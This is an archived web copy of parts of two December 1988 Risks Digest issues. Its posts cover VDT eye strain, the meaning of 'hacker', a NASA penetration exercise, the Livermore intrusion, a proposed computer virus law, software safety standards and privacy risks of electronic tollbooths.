Hoffman.ElSegundo@Xerox.com
</A>&gt;
</address>
<i>
6 Dec 88 21:00:21 PST (Tuesday)
</i><PRE>

The 5 December 1988 'Los Angeles Times' reprinted a story from the November
1988 issue of the UCBerkeley 'Wellness Letter' headlined PREMATURE LOSS OF
ABILITY TO FOCUS EYES LINKED TO VDT USE.

The article reports on clinical findings by Dr. James Sheedy, chief of the
VDT clinic at the UCBerkeley School of Optometry.  Sheedy emphasized that
his evidence is preliminary and that his conclusions are based on people
who had come to the clinic with eye problems -- not on a controlled study.
These preliminary findings:

  Of 153 patients who averaged six hours a day at a VDT for four or more 
  years, more than half had difficulty changing focus.  Presbyopia, or 
  loss of ability to focus with advancing age, accounted for half of 
  these problems.  The rest of the patients, though, were in their 20s
  and 30s and should have had good focusing mechanisms.

The article goes on to recommend appropriate eyeglasses, nonreflective
screens, frequent breaks, etc.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
NEW YORK TIMES reviews novel about computer sabotage
</A>
</H3>
<address>
&lt;<A HREF="mailto:jon@june.cs.washington.edu">
jon@june.cs.washington.edu
</A>&gt;
</address>
<i>
Wed, 07 Dec 88 09:10:40 PST
</i><PRE>

The Sunday, Dec. 4 issue of the NEW YORK TIMES BOOK REVIEW (their Christmas
Books issue) prominently reviews a new novel, TRAPDOOR, by Bernard J.
O'Keefe.  The premise (from the review by Newgate Callender, NYT's crime
fiction reviewer):

"A brilliant American woman of Lebanese descent has developed the computer
code that controls the operation of all our nuclear devices.  Turned down for
the job she has sought, convinced male chauvinism is the reason, she is ripe
to be conned by a Lebanese activist.  At his suggestion she inserts a virus
into the computer system that in a short time will render the entire American
nuclear arsenal useless.  ... The Lebanese President ... demands that Israel
withdraw from the West Bank, or else he will tell the Russians that the
United States will lie helpless for a week or so."

Callender's review begins with the lead sentence, "Nov 2, 1988, was the day
computers in American went mad, thanks to the `virus' program inserted by
the now-famous, fun-loving Robert T. Morris, Jr."

Some background on the author, also from the review:

"Bernard J. O'Keefe (is) chairman of the high-tech company EG&amp;G and of an
international task force on nuclear terrorism ... (and is) the author
of a nonfiction book called NUCLEAR HOSTAGES.  (O'Keefe says) "I wrote this
parable to point out the complexity of modern technology and to demonstrate
how one error, one misjudgment, or one act of sabotage could lead to actions
that would annihilate civilization." "

Callender also says "...the execution is less brilliant than the idea. ..
The book has the usual flashbacks, the usual stereotyped characters, the
usual stiff dialogue."

Although the reviewer doesn't say so, the premise of this novel is quite
similar to a 1985 French thriller, published in the U.S. as SOFTWAR.  That
novel was also based on the idea that a nation's arsenal could be completely
disabled from a single point of sabotage, although in SOFTWAR it was the Soviet
Union on the receiving end.  Popular reviewers of both books apparently find
nothing implausible in the premise.
                                     - Jonathan Jacky, University of Washington

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
meaning of "hack"
</A>
</H3>
<address>
RAMontante 
&lt;<A HREF="mailto:bobmon@iuvax.cs.indiana.edu">
bobmon@iuvax.cs.indiana.edu
</A>&gt;
</address>
<i>
Wed, 7 Dec 88 21:19:20 EST
</i><PRE>

I met the word "hack" at MIT in 1972, and I must admit that the current
single-minded and increasingly pejorative usage bothers me.  Let me
quote from the Lexicon section of "How To Get Around MIT (1972 ed.)":

    Hack -- (1) A noun denoting a trick or prank.  For example, welding
    a streetcar onto the tracks or getting elected UAP are fine hacks.
    (2) A verb meaning to goof off, talk randomly, or just hang around.
    (3) A verb meaning to apply oneself, work hard, try earnestly.
    Example:  A computer hacker.  Also connotes fanaticism.  (4) Harrass
    somebody, whether in fun or maliciously.

Meaning (4) covers both the weather balloon planted in the Harvard-Yale
football game some years ago, and the wishing well constructed in a
friend's dorm room one holiday season.

One more quote from HoToGAMIT, under "THE OTHER EDUCATION":

    Metallurgy Shop
    For creative metallurgy or just hacking, 4-133 (the home of Tony
    Zona) is the place to be.  you can learn welding, brazing, and
    soldering...

</PRE>
<HR><H3><A NAME="subj4.2">
Hacker's Dictionary definition of Hacker
</A>
</H3>
<address>
Russ Nelson 
&lt;<A HREF="mailto:nelson@sun.soe.clarkson.edu">
nelson@sun.soe.clarkson.edu
</A>&gt;
</address>
<i>
Wed, 7 Dec 88 09:59:39 EST
</i><PRE>

Perhaps it's time to go to an authoritative source--the Hacker's Dictionary.

HACKER, noun.
  1. A person who enjoys learning the details of computer systems and
     how to stretch their capabilities--as opposed to most users of
     computers, who prefer to learn only the minimum amount necessary.
  2. One who programs enthusiastically, or who enjoys programming
     rather than just theorizing about programming.
  3. A person capable of appreciating HACK VALUE.
  4. A person who is good at programming quickly.  (By the way, not
     everything a hacker produces is a hack.)
  5. An expert on a particular program, or one who frequently does
     work using it or on it.  Example: "A SAIL hacker."  (This
     definition and the preceding ones are correlated, and people who
     fit them congregate.)
  6. An expert of any kind.  One might be an astronomy hacker, for
     example.
  7. A malicious or inquisitve meddler who tries to discover
     information by poking around.  For example, a "password hacker"
     is one who tries, possibly by deceptive or illegal means, to
     discover other people's computer passwords.  A "network hacker"
     is one who tries to learn about the computer network (possibly
     because he wants to improve it or possibly because he wants to
     interfere--one can tell the difference only by context and tone
     of voice).

</PRE>
<HR><H3><A NAME="subj4.3">
hacker/cracker/snacker, and now: "slacker"
</A>
</H3>
<address>
Douglas Monk 
&lt;<A HREF="mailto:bro@rice.edu">
bro@rice.edu
</A>&gt;
</address>
<i>
Wed, 7 Dec 88 15:45:10 CST
</i><PRE>

slacker : referring to a person who wrote sleazy or shoddy code but who
should have known better, or was too lazy, or didn't think or care enough.

Doug Monk (bro@rice.edu)

</PRE>
<HR><H3><A NAME="subj4.4">
Re: "cracker", "hacker."
</A>
</H3>
<address>
Andrew Klossner 
&lt;<A HREF="mailto:andrew%frip.gwd.tek.com@RELAY.CS.NET">
andrew%frip.gwd.tek.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Tue,  6 Dec 88 15:11:17 PST
</i><PRE>
Organization: Tektronix, Wilsonville, Oregon

	"We desperately need a convenient term like "cracker", because
	the nonpejorative primary meaning of "hacker" needs to be
	defended vigorously against misuse by the press and others."

I disagree.  The word "hacker" is now embedded in the American language
to mean a computer attacker.  No amount of energy spent railing against
this new use will put an end to it, any more than we can make a plural
noun again of "data."

Let's spend our vigorous efforts in areas that truly merit them.

  -=- Andrew Klossner   (uunet!tektronix!hammer!frip!andrew)    [UUCP]
                        (andrew%frip.gwd.tek.com@relay.cs.net)  [ARPA]

</PRE>
<HR><H3><A NAME="subj4.5">
HACKERS CAN HELP YOUR SECURITY
</A>
</H3>
<address>
SIANI@nssdca.GSFC.NASA.GOV 
&lt;<A HREF="mailto:Kenneth Siani">
Kenneth Siani
</A>&gt;
</address>
<i>
Thu,  8 Dec 88 15:24:14 EST
</i><PRE>

   Much has been said recently about the evils of hackers and hacking.
I would like to say a few words in their defence. 
Before entering the 'orthodox' computer security field, I myself
was a mysterious phantom of the night. :-) I am sure quite a number
of persons in this field of computer security started out this way.
Perhaps this fact gives me some insight on the subject of hackers.


   I would like to clear up a few popular misconceptions about hackers.
Hackers are not the people that destroy systems nor are they the people
that penetrate systems to steal secret information or money. People 
that preform such acts are vandals and thieves, they are not true
hackers. The only remote connection between such persons and hackers is
the fact that both often do their work via modem and they both exploit
weakness in computer security. Another thing that separates true hackers
from the vandals that are mistakenly called hackers is motivation. 
Hackers are motivated by a great and intense quest for computer knowledge
and perhaps the feeling of power that comes from it. 
In addition, hackers have a true love of computers, and would never 
purposely damage any system. Destroyers of systems have no such love, and
their motivations are quite different!

 
   I am sure many of us have put a great deal of effort into making our
systems as secure as possible. In our effort to make our systems secure, 
we have read the red book, the orange book, the MITRE reports and all
the many other security related journals, books and reports.
We go to very expensive computer security seminars to hear wisdom 
from the experts and we try to implement all the safeguards the experts
tell us about. Yet, the hackers still get in! Even the National Security
Agency, the 'High Priests' of computer security, have had hackers running
around their systems. Nobody seems to be immune to hackers!


   Rather then focusing on the negative aspect of hacking and hackers,
I would like to share with you a very positive experience with hackers that
I was privileged to be a part of. During the summer of 87, I lead a group
of real hackers on an assault of some of NASA's computer systems at the
Goddard Space Flight Center in Greenbelt MD. One goal of this effort was to
test the electronic venerability of selected computer systems at GSFC NASA.
Another objective of this study was to raise the security consciousness
of not only the key personnel of the selected target systems, but of all
the users of the systems at GSFC. 


   This effort was known as "HACK ATTACK". A full report of all methods
used and the success and failures of each were made. In addition, specific
recommendations were made to improve the security of the penetrated systems.
The official report is quite sensitive, but an unclassified yet very
informative abstract of the report was presented at the AIAA/ASIS/IEEE 
Third Aerospace Computer Security Conference held in Orlando Florida
Dec. 7th - 11th 1987.
You may wish to contact the American Institute of Aeronautics and
Astronautics, 370 L'Enfant Promenade, SW, Washington, DC 20024-2518,
for information about getting a copy of the report. The title is:
THE HACK ATTACK, INCREASING COMPUTER SYSTEM AWARENESS OF VULNERABILITY 
THREATS.


   The Hack Attack was conducted in a very controlled manner, but the
hackers were real and the results were a great surprize to all of us.
Some of the hacker techniques employed were the Forward Hack, Reverse Hack,
Default Account Hack, The Decoy and my personal favorite, Social Engineering.
Some software bugs were exploited, as were some basic human weaknesses.
The hackers ranged in experience, education and computer literacy from
novice high school hackers to more experienced college level hackers.
One thing shared by all of them and myself, was a great enthusiasm for
the project. It truly was a game of wits, the hackers against the systems
and their operators. 
Some systems were penetrated while others were not. In the end there were no
losers, only winners. The security weakness of some systems were exposed
while the strengths of others were confirmed. 

   
    As a direct result of the Hack Attack some software has been modified and
some policy has been changed. But the greatest change of all has been in the
user community. The security consciousness of the users has greatly increased,
and that was of course our primary goal. Perhaps your systems and users
could benefit from such an experience. You would be surprized to find out
just how many hackers would be willing to help you plug the holes in your
system. You would be equally surprized how much more seriously your users
would consider the issue of computer security after they have been exposed
to a Hack Attack.


The Hack Attack has made a lasting impression on people.
It has been over a year since the Hack Attack, but to this very day, people
cover up their terminal screens or log off their computers when
I enter the room.  :-)


DISCLAIMER: The views expressed here are my own and not that of my employer,
NASA, the NSA, or any other person or government agency.

Kenneth Siani
Sr. Security Specialist 
Internet address:  { SIANI@NSSDCA.GSFC.NASA.GOV }

</PRE>
<HR><H3><A NAME="subj4.6">
     Hacking as a profession... Why not?
</A>
</H3>
<address>
Don Mac Phee 
&lt;<A HREF="mailto:BIW137@URIACC.BITNET">
BIW137@URIACC.BITNET
</A>&gt;
</address>
<i>
Thu, 08 Dec 88 09:59:40 EST
</i><PRE>

  I have been involved in mainframe computing for a number of years on systems
ranging from an NCR mainframe (I've blissfully forgotten the type! :-) )
through to a VAX 8600. And in my experience as a user, I've found that a hacker
can be one of the greatest assets to a system. No administrator is omnipotent
and sometimes they can make serious mistakes in the installation of a certain
package, or pay negligible attention to loopholes in the operating system that
can lead to increased downtime or even worse... virus attacks that paralyze the
system. But the question I pose to the RISKS reader is this:

   Why don't the manufacturers hire 'hackers' to debug their operating systems?
I'm not speaking of the countless consulting firms that do security work, or
the people who designed the system. Instead, I speak specifically of the
'hacker' as a bright energetic person who sees the system from a different
viewpoint from that of the administrator, or the designer. Someone who, when
given a set of manuals about the design of the system and the operation, can
'break in' legitimately and show the flaws.

  Maybe I'm naive, but isn't the best way to design a mousetrap, is to build
it, then send the mice through?

-Don Mac Phee (BIW137@URIACC.BITNET)

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Unquestioning belief in expert testimony
</A>
</H3>
<address>
Matt Bishop
&lt;<A HREF="mailto:bishop@bear.Dartmouth.EDU ">
bishop@bear.Dartmouth.EDU 
</A>&gt;
</address>
<i>
Wed, 7 Dec 88 09:00:56 EST
</i><PRE>

In RISKS 7.89, Clifford Johnson tells of a speeder who was convicted because
of testimony of a university mathematician involving the Mean Value Theorem.
One of the risks of being involved with science and technology is that often
we deal with things that the public does not completely understand, and so
has to "take our word for".  This can have quite drastic consequences.

Haber-Runyon's book "General Statistics" has a graphic example of this (see p.
156-157).  An elderly woman was mugged in California, and a witness saw a
"blonde girl with a ponytail run from the alley and jump into a yellow car
driven by a bearded Negro."  Eventually, a couple were arrested and tried for
the crime; the evidence against them was that the woman "was white, blonde, and
wore a ponytail while her Negro husband owned a yellow car and had a beard."
Both were convicted, because the prosecutor got an expert witness from the math
department of a nearby college to testify that the probability of a set of
events occuring is the product of the probability of each of the events
actually occurring; and using "conservative estimates" (such as the chances of
a car's being yellow is 1 in 10, the chances of a couple in a car being
interracial ia 1 in 1,000, etc.), he concluded the odds of any other couple
sharing the characteristics of the defendents is 1 in 12,000,000.  That was
enough for the jury.

Fortunately, the California Supreme Court disagreed.  Aside from the illegality
of "trial by mathematics", the math expert didn't go far enough -- assuming
everything he (or she) said was true, one Justice pointed out that there was a
41% chance that at least one other couple in the area will also share those
characteristics! (He attached a 4 page appendix to the opinion demonstrating
this to his own, and five concurring justices', satisfaction.)

Such are the dangers of encouraging blind trust in experts ...
                                                                 Matt Bishop

PS: The woman was released earlier and broke parole when she "lit out
for parts unknown."  The man was in jail at the time of the Supreme
Court's opinion; "he could be tried again, but the odds are against it."

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.89.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.91.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-43</DOCNO>
<DOCOLDNO>IA012-000131-B036-52</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.91.html 128.240.150.127 19970217024419 text/html 26115
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:42:44 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 91</TITLE>
<LINK REL="Prev" HREF="/Risks/7.90.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.92.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.90.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.92.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 91</H1>
<H2> Sunday 11 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
More on Proper British Programs 
</A>
<DD>
<A HREF="#subj1.1">
Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Vendor Liability, and "Plain Vanilla" configurations 
</A>
<DD>
<A HREF="#subj2.1">
Jay Elinsky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Manufacturers' Responsibilities for Security 
</A>
<DD>
<A HREF="#subj3.1">
Lynn R Grant
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Hacker enters U.S. lab's computers 
</A>
<DD>
<A HREF="#subj4.1">
George Wood via Werner Uhrig
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Computer Virus Eradication Act of 1988 
</A>
<DD>
<A HREF="#subj5.1">
Don Alvarez
</A><br>
<A HREF="#subj5.2">
 from VIRUS-L
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  They did it: Speed-Thru Tollbooths 
</A>
<DD>
<A HREF="#subj6.1">
Robert Steven Glickstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Toll Road information collection    
</A>
<DD>
<A HREF="#subj7.1">
Brint Cooper
</A><br>
<A HREF="#subj7.2">
 Scott E. Preece
</A><br>
<A HREF="#subj7.3">
 John Sullivan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Subways that "know" who's on board 
</A>
<DD>
<A HREF="#subj8.1">
Chris Hibbert
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
More on Proper British Programs
</A>
</H3>
<address>
&lt;<A HREF="mailto:leveson@electron.LCS.MIT.EDU">
leveson@electron.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Fri, 09 Dec 88 13:00:37 -0500
</i><PRE>

You probably all know about the MoD draft standard in Great Britain requiring
formal verification of safety-critical software.  Well, here is another one.
I was asked to consult on the safety of a microwave landing system, and
they have just sent me a copy of a draft attachment to an international 
standard for MLS systems by the ICAO (international organization overseeing 
such aircraft systems).  This may no longer be a draft -- there is no date 
on it and the company implied that they had to follow it.   As you can see
from the following, there is an "out,"  but the sophistication of the standard
is a surprise to me (most American software standards are abysmal).  Since 
the ICAO must certify these systems before they are used, the standard has
teeth and could be enforced quite strictly (unlikely, but ...). The following 
are some interesting excerpts:

  "... [Software] must be developed systematically in such a way that its
   behavior, under all possible conditions, can be established by logical
   reasoning (to a level of formality appropriate to the application).

  "... The programming should be performed in such a way that it is easily
   possible to establish the correspondence between the programme and its
   design and to verify its correctness with respect to its specification
   by logical reasoning (possibly supported by software tools).

  "... The interface of every software module with its enclosing environment
   should be explicitly stated in a preamble within its code, as well as in the 
   design documentation.  Where possible, a formal specification (e.g., in
   terms of pre- and post- conditions) should be given.

  "... Consistency of the code and its comments with the specification and the
   design documents should be checked, as formally and precisely as possible,
   as each module is developed.  Formal verification (i.e., proofs of
   consistency between formal specifications of software modules and their
   code) should be performed where possible.  Otherwise, manual code 
   inspections or structured walk-throughs are essential.  A software safety
   analysis should be performed as part of the design and development using
   at least one technique such as FMECA, fault tree analysis, or cause and
   consequence analysis..."
   
</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: Vendor Liability, and "Plain Vanilla" configurations (<A HREF="/Risks/7.88.html">RISKS-7.88</A>)
</A>
</H3>
<address>
"Jay Elinsky" 
&lt;<A HREF="mailto:ELINSKY%YKTVMX.BITNET@CUNYVM.CUNY.EDU">
ELINSKY%YKTVMX.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Tue, 6 Dec 88 17:05:38 EST
</i><PRE>

Maybe GM and the other manufacturers *would* sell cars without seat belts and
warning buzzers, if there wasn't a *law* requiring them.  So if we accept
this as a valid analogy (I'm not saying it is or isn't), then the conclusion
is that we need a law requiring computers to have adequate security.

Jay Elinsky, IBM T.J. Watson Research Center, Yorktown Heights, NY 
[Affiliation for identification only]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Manufacturers' Responsibilities for Security (<A HREF="/Risks/7.86.html">RISKS-7.86</A>)
</A>
</H3>
<address>
Lynn R Grant 
&lt;<A HREF="mailto:Grant@DOCKMASTER.ARPA">
Grant@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Sun, 4 Dec 88 16:46 EST
</i><PRE>

Having been in the security software business for several years, I must take
some exception to Keith Hanlan's comments on manufacturer's responsibilities
for security.  While I truly believe that some vendors use the excuses he
mentioned for not making their products secure, there is some merit to them.

Security is not free.  Those of us in this business do the best we can to make
secure systems easy to use (at least the good ones among us do), but a wide
open system is usually easier to use.  Security involves a tradeoff:  it what
it costs you less than what you might lose without it.  The customer may decide
it isn't worth the cost.  He may be wrong, but it's still his decision.

As for bugs, bugs should be fixed.  But design flaws that influence security
are trickier.  For some reason, customers tend to find these flaws, and set up
their production systems so they depend upon them.  Thus, when you fix them,
suddenly your customer's shops don't run anymore, and they get very irate.  If
your competitors do not fix the problem in their software, your customers see
this as a feature, and it puts you at a competitive disadvantage.  I can see
how some vendors might knuckle under to this pressure, figuring that fighting
for security ideals is of no use if all the customers flee for some less secure
system and cause the company to fold up.

Let me reiterate that this is not a wholesale defense of those who ignore
security in the name of ease of use (which may really be ease of
implementation).  I just want to point out the pressures that exist in the
competitive arena of commercial software.

Lynn R. Grant, Technical Consultant, Computer Associates International, Inc.
Disclaimer:  These opinions are my own, and may or may not reflect those
             of my employer.

     [One man's feature is another man's future.  But one person's feature
     can also be someone else's destruction.  I am reminded of the multiple
     index register instructions in the IBM 7090 that stopped working in the
     7094 because they were `only features' and were not officially supported.
     Anyone who lives by unsupported features may die the same way.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Hacker enters U.S. lab's computers 
</A>
</H3>
<address>
George Wood
&lt;<A HREF="mailto:wood@emmy.ma.UTEXAS.EDU ">
wood@emmy.ma.UTEXAS.EDU 
</A>&gt;
</address>
<i>
Sat, 10 Dec 88 20:33:00 CST
</i><PRE>
Resent-From: Werner Uhrig &lt;werner@rascal.ics.UTEXAS.EDU&gt;

Austin-American Statesman, Saturday, December 10, 1988, P. A29

           Hacker enters U.S. lab's computers
     By Thomas H. Maugh II, Los Angeles Times Service

	A computer hacker has entered computers at the government's
Lawrence Livermore Laboratory in the San Francisco Bay area eight
times since last Saturday, but has not caused any damage and has not
been able to enter computers that contain classified information,
Livermore officials said Friday.
	Nuclear weapons and the Star Wars defense system are designed
at livermore, but information about those projects is kept in
supercomputers that are physically and electronically separate from
other computers at the laboratory.
	The hacker, whose identitiy remains unknown, entered the
non-classified computer system at Livermore through INTERNET, a
nationwide computer network that was shut down at the beginning of
November by a computer virus.  Chuck Cole, Livermore's chief of
security, said the two incidents apparently are unrelated.
	The hacker entered the computers through an operating system
and then through a conventional telephone line, He gave himself
"super-user" status, providing access to virtually all functions of
the non-classified computer systems.
	Officials quickly limited the super-user access, although they
left some computers vulnerable to entry in the hope of catching the intruder.
	"There has been no maliciousness so far," Cole said.  "He
could have destroyed data, but he didn't.  he just looks through data
files, operating records, and password files....It semms to be someone
doing a joy-riding thing."

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Computer Virus Eradication Act of 1988 
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
Mon, 5 Dec 88 16:43:12 EST
</i><PRE>
         [EXCERPT from VIRUS-L Digest V1 #33]

VIRUS-L Digest              Monday, 5 Dec 1988          Volume 1 : Issue 33

Date: Mon, 5 Dec 88 11:11:06 EST
From: Don Alvarez &lt;boomer@space.mit.edu&gt;
Subject: Computer Virus Eradication Act of 1988

    I just received a copy of HR-5061, a new bill being introduced
    in the House by Wally Herger (R-CA) and Robert Carr (D-Mich.).
    The text of the bill is included below (see disclaimer).

    It sounds to me like there are some subscribers to VIRUS-L
    who's background is more criminal law than computer science,
    perhaps some of you could help the rest of us out with a little
    commentary.  Would this bill be helpful to you?  Do you think
    you would be able to get a conviction with it?  Do you think
    you would be able to recover your damages with it (and how would
    you go about defining those damages if you were to use the law)?

    If people are interested in sending their comments to the
    authors, I include the name and address of the legislative
    aide who has been working on this bill.  If people would like
    to e-mail their comments, you can send them to me and I will
    mail them to him in a packet (be sure to include your name and
    normal postal mail adress, as congress isn't on the net).

                        Don Alvarez, boomer@SPACE.MIT.EDU


- ------Start of Bill

100th Congress 2D Session                                     H.R. 5061
To amend title 18, United States Code, to provide penalties for persons
interfering with the operations of computers through the use of programs
containing hidden commands that can cause harm, and for other purposes.

IN THE HOUSE OF REPRESENTATIVES                           July 14, 1988
Mr. Herger (for himself and Mr. Carr) introduced the following bill;
which was referred to the Committee on the Judiciary

A BILL
To ammend title 18, United States Code, to provide penalties for persons
interfering with the operations of computers through the use of programs
containing hidden commands that can cause harm, and for other purposes.

1          Be it enacted by the Senate and House of Representa-
2    tives of the United States of America in Congress assembled,
3    SECTION 1. SHORT TITLE.
4          This Act may be cited as the "Computer Virus Eradica-
5    tion Act of 1988".

- -------Page 2

1    SECTION 2. TITLE 18 AMENDMENT.
2          (a) IN GENERAL.- Chapter 65 (relating to malicious
3    mischief) of title 18, United States Code, is amended by
4    adding at the end the following:
5    "S 1368.  Disseminating computer viruses and other harm-
6              ful computer programs
7         "(a) Whoever knowingly-
8             "(1) inserts into a program for a computer infor-
9           mation or commands, knowing or having reason to be-
10          lieve that such information or commands will cause
11          loss to users of a computer on which such program is
12          run or to those who rely on information processed on
13          such computer; and
14            "(2) provides such a program to others in circum-
15          stances in which those others do not know of the inser-
16          tion or its effects;
17   or attempts to do so, shall if any such conduct affects
18   interstate or foreign commerce, be fined under this title or
19   imprisoned not more than 10 years, or both.
20        "(b) Whoever suffers loss by reason of a violation of
21   subsection (a) may, in a civil action against the violator,
22   obtain appropriate relief.  In a civil action under this section,
23   the court may award to the prevailing party a reasonable attor-
24   ney's fee and other litigation expenses.".

- --------Page 3

1         (b) CLERICAL AMENDMENT.- The table of sections at
2    the begining of chapter 65 of title 18, United States Code,
3    is amended by adding at the end the following:
  "1368. Disseminating computer viruses and other harmful computer programs.".

- --------End of Bill

&gt;&gt;&gt;&gt;NOTE: The above text was typed in by hand from a printed copy of HR5061
&gt;&gt;&gt;&gt;      received from Mr. Herger's office.  I have no experience with
&gt;&gt;&gt;&gt;      legal documents of this sort, and may have made typographical
&gt;&gt;&gt;&gt;      errors which could affect the nature of the bill.  Neither
&gt;&gt;&gt;&gt;      I nor my employer (MIT Center for Space Research) make any claims
&gt;&gt;&gt;&gt;      as to the accuracy of the text.  For an official copy of the
&gt;&gt;&gt;&gt;      bill, please contact:
&gt;&gt;&gt;&gt;
&gt;&gt;&gt;&gt;                Mr. Doug Riggs
&gt;&gt;&gt;&gt;                1108 Longworth Bldg
&gt;&gt;&gt;&gt;                Washington D.C.  20515

</PRE>
<HR><H3><A NAME="subj5.2">
They did it: Speed-Thru Tollbooths
</A>
</H3>
<address>
Robert Steven Glickstein 
&lt;<A HREF="mailto:bobg+@andrew.cmu.edu">
bobg+@andrew.cmu.edu
</A>&gt;
</address>
<i>
Tue,  6 Dec 88 17:13:43 -0500 (EST)
</i><PRE>

A news report last night on the Headline News Channel reported the experimental
installation of a new kind of tollbooth in Dallas, TX (I think?), and one or
two other places.  Instead of tossing money into a hopper, you just drive on
through -- while a low-frequency, low-power radio signal polls an electronic
"tag" taped to your windshield, which (hopefully) squawks a valid code back at
it.  (I was sort of amused to learn from the newscaster that this "tag" is made
from "printed circuits, capacitors and diodes.")  Reportedly, toll plazas in
New York City and about a dozen other places will soon be outfitted with the
new technology.

The problems with this system from a RISKS perspective are numerous and
evident.  Perhaps the most troubling is that the system works on an accounting
principle.  Your "tag" uniquely identifies itself to the transmitter in the
tollbooth, and your passage is recorded.  Presumably you then get a monthly
bill from the highway people.  The problem here, of course, is that when you
drive through a tollbooth, Big Brother knows exactly where you are.

&gt; *Excerpts from ext.in.risks: 18-Nov-88 Smart Roads (RISKS 7.81) Robert*
&gt; *Brooks@sde.hp.com (1040)*
&gt; Much concern has been expressed about the Big Brother potential of such
&gt; systems.  But this is by no means an essential hazard.  The transponders,
&gt; barcode tags, or whatever could be purchased anonymously, and authorization
&gt; to cross various toll points n times purchased in advance, like postage 
&gt; stamps.

This would be fine, except that if the tags are completely indentity-free, then
stolen tags become especially problematic -- the thief is in no danger of the
tag becoming disabled, and the victim pays the thief's way through n tollbooth
passages, where n could be quite large (and quite expensive, especially in New
York, where tolls currently go as high as $3 for passenger cars).  The
temptation to thieves to break into cars so equipped would therefore be very
great.  In the current system, the tag is a non-descript black box secured
above the registration/inspection stickers by Velcro strips.  Even if a car
owner were to hide the tag in the glove compartment when not in use, the Velcro
strips, permanently adhered to the windshield, are a dead giveaway.

The RISKS of theft are great even in the case of identifiable tags.  The
